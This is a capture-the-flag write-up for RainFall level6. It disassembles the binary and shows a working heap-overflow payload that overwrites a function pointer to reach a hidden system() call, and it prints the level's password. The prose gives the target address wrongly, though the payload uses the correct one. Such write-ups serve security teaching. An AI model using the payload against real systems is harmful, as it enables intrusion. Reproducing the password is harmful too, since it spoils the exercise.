# level6

> We use [GDB peda](https://github.com/longld/peda) in order to get a better GDB visualization.

1. [Analysis](#analysis)
2. [Exploit](#exploit)

## Analysis

We take a look at the existing functions inside the binary.

```gdb
gdb-peda$ disas main
Dump of assembler code for function main:
   0x0804847c <+0>:     push   ebp
   0x0804847d <+1>:     mov    ebp,esp
   0x0804847f <+3>:     and    esp,0xfffffff0
   0x08048482 <+6>:     sub    esp,0x20
   0x08048485 <+9>:     mov    DWORD PTR [esp],0x40         ; load 64 as arg
   0x0804848c <+16>:    call   0x8048350 <malloc@plt>       ; malloc(64)
   0x08048491 <+21>:    mov    DWORD PTR [esp+0x1c],eax     ; pointer of malloc is stored at [esp+0x1c]
   0x08048495 <+25>:    mov    DWORD PTR [esp],0x4          ; load 4 as arg
   0x0804849c <+32>:    call   0x8048350 <malloc@plt>       ; malloc(4)
   0x080484a1 <+37>:    mov    DWORD PTR [esp+0x18],eax     ; pointer of last malloc is stored at [esp+0x18]
   0x080484a5 <+41>:    mov    edx,0x8048468                ; move 0x8048468 (<m>) to edx
   0x080484aa <+46>:    mov    eax,DWORD PTR [esp+0x18]     ; load pointer at [esp+0x18] (malloc(4)) into eax
   0x080484ae <+50>:    mov    DWORD PTR [eax],edx          ; mov edx (<m>) into stack pointed by eax
   0x080484b0 <+52>:    mov    eax,DWORD PTR [ebp+0xc]      ; load address [ebp+12] into eax
   0x080484b3 <+55>:    add    eax,0x4                      ; [ebp+12] + 4: seems to be argv[1]
   0x080484b6 <+58>:    mov    eax,DWORD PTR [eax]          ; load argv[1] into eax
   0x080484b8 <+60>:    mov    edx,eax                      ; load argv[1] into edx
   0x080484ba <+62>:    mov    eax,DWORD PTR [esp+0x1c]     ; load [esp+0x1c] (malloc(64)) into eax
   0x080484be <+66>:    mov    DWORD PTR [esp+0x4],edx      ; arg2 = argv[1]
   0x080484c2 <+70>:    mov    DWORD PTR [esp],eax          ; arg1 = pointer malloc(64)
   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>       ; strcpy(malloc(64), argv[1])
   0x080484ca <+78>:    mov    eax,DWORD PTR [esp+0x18]     ; load [esp+0x18] into eax
   0x080484ce <+82>:    mov    eax,DWORD PTR [eax]          ; get first argument of struct pointed by eax
   0x080484d0 <+84>:    call   eax                          ; call eax where eax point to <m> (function pointer)
   0x080484d2 <+86>:    leave
   0x080484d3 <+87>:    ret
End of assembler dump.
```

```gdb
gdb-peda$ disas m
Dump of assembler code for function m:
   0x08048468 <+0>:     push   ebp
   0x08048469 <+1>:     mov    ebp,esp
   0x0804846b <+3>:     sub    esp,0x18
   0x0804846e <+6>:     mov    DWORD PTR [esp],0x80485d1    ; 0x80485d1 = "Nope"
   0x08048475 <+13>:    call   0x8048360 <puts@plt>         ; puts("Nope")
   0x0804847a <+18>:    leave
   0x0804847b <+19>:    ret
End of assembler dump.
```

```gdb
gdb-peda$ disas n
Dump of assembler code for function n:
   0x08048454 <+0>:     push   ebp
   0x08048455 <+1>:     mov    ebp,esp
   0x08048457 <+3>:     sub    esp,0x18
   0x0804845a <+6>:     mov    DWORD PTR [esp],0x80485b0    ; 0x80485b0 = "/bin/cat /home/user/level7/.pass"
   0x08048461 <+13>:    call   0x8048370 <system@plt>       ; system("/bin/cat /home/user/level7/.pass")
   0x08048466 <+18>:    leave
   0x08048467 <+19>:    ret
End of assembler dump.
```

After analysing the differents functions we understand that we need to use the `call eax` instruction at `main<+84>` to make it call the hidden function `n` which will display the `.pass` file.

Since `malloc` will allocate 64 bytes for the string, then 4 more for the address of the function `m` (function pointer), theses two memory spaces will be contiguous.

The use of `strcpy`, which does not check the source string length, to write inside the address returned by the first `malloc`, will allow us to perform a buffer overflow attack on the heap to overwrite the address stored inside the function pointer (`m` address) with the address of `n`.

## Exploit

The argument we send must be long enough to fill in the 64 bytes allocated by the first `malloc` call, plus the 8 bytes of block metadata. The 4th next bytes, corresponding to the second `malloc` allocation, must be replaced with the address of `n` function (0x08048468).

```console
level6@RainFall:~$ ./level6 `python -c 'print "A"*72 + "\x54\x84\x04\x08"'`
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```